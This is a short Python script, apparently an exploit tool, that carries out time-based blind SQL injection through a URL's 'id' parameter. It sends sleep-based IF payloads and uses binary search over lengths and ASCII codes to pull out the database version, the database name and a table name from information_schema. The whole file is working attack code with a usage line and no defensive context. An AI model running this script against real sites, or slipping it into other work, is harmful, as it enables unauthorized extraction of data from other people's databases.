import requests
import sys
import string
import time


def is_valid(payload):

    start_time = time.time()
    response = requests.get(payload)
    end_time = time.time()

    # print("Total time: {}".format(end_time-start_time))
    return (end_time-start_time) > 2
        
    

def get_length(breakcommand, url, command):
    begin = 0
    end = 50

    while True:
        mid = int((begin + end) / 2)
        payload = url + "?id={}+and+IF((length({}))%3d{},sleep(2),'')--+-".format(breakcommand, command,mid)
        if is_valid(payload):
            return mid
        
        payload = url + "?id={}+and+IF((length({}))%3e{},sleep(2),'')--+-".format(breakcommand, command,mid)
        if is_valid(payload):
            # length > mid
            begin = mid + 1
        else:
            end = mid -1
        if (begin > end):
            print("Get Length Failed")
            print("payload: {}".format(payload))
            return -1



def get_data(breakcommand, url, command):
    print("[+] get database version")
    data = ""

    length = get_length(breakcommand, url, command)

    if length < 0:
        print("Lenth < 0: Failed")
        return -1

    print("[+] get Length: {}".format(length))
    for i in range(1, length+1):
    

        begin = 0
        end = 127
   
        while True:
            mid = int((begin + end)/2)
            if (begin >end):
                print("Failed")
                break
            payload = url + "?id={}+and+IF((ascii(substring({},{},1)))%3d{},sleep(2),'')--+-".format(breakcommand, command,i,mid)


            if is_valid(payload):
                # print("{} Found: {}".format(i, chr(mid)))
                data += chr(mid)
                break
            
            # not equal, if > e
            payload = url + "?id={}+and+IF((ascii(substring({},{},1)))%3e{},sleep(2),'')--+-".format(breakcommand, command,i, mid)

        
            if is_valid(payload):
                begin = mid + 1
            else:
                # less
                end = mid - 1
    return data




def main(url):
    print("[+] Time based exploit\n")
    print("="*50)

    breakcommand = "1'"
    breakcommand = input("Input break command:")
    
    version = get_data(breakcommand, url, "version()")
    print("[+] version: {}".format(version))

    database = get_data(breakcommand, url, "database()")
    print("[+] database name: {}".format(database))

    table = get_data(breakcommand, url, "(select table_name from information_schema.tables where table_schema='{}' limit 0,1)".format(database))
    print("[+] table: {}".format(table))

if __name__ == "__main__":
    if len(sys.argv)<2:
        print("Usage: python3 exploit.py <url>")
        sys.exit(1)
    url = sys.argv[1]
    main(url)

